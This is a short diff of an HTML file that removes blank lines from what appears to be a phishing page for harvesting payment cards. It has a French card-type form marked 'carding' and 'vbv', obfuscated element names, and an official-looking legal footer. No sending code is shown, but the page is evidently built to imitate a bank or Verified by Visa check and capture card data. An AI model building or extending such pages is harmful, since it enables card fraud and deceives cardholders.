@@ -8,8 +8,6 @@
           content="Designed to be the perfect YUJFNVting point&nbsp;for any dashboard or admin site. Charts,&nbsp;graphs, sortable tables,&nbsp;and more than a dozen other new&nbsp;components included.">
     <link rel="icon" type="image/png" href="app/views/assets/img/favicon.png">
     <link href="assets/css/merchant.css" rel="stylesheet" type="text/css">
-
-
 </head>
 <body>
 <form method="post" id="X-dllOOPD" class="X-dllOOPDRT carding" for="vbv">
@@ -42,8 +40,6 @@
                         <div class="RRTITOTGHFHFERROR_message" class="warning_message"></div>
                     </div>
                 </div>
-
-
                 <div id="TYTUTIOOFJF" style="margin-left: 100px;">
                         <div class="TTYUYIBNVCCXXD OOPFFVNZZ">
                             <label for="card-type-trv">Type de carte<span class="YUJFNV"> *</span></label>
@@ -153,7 +149,6 @@
         </div>
     </div>
 </form>
-
 <div id="footer">
     <div class="legal">
         <p>Conformément à la loi "informatique et libertés" du 6 janvier 1978 modifiée, vous disposez à tout moment d'un
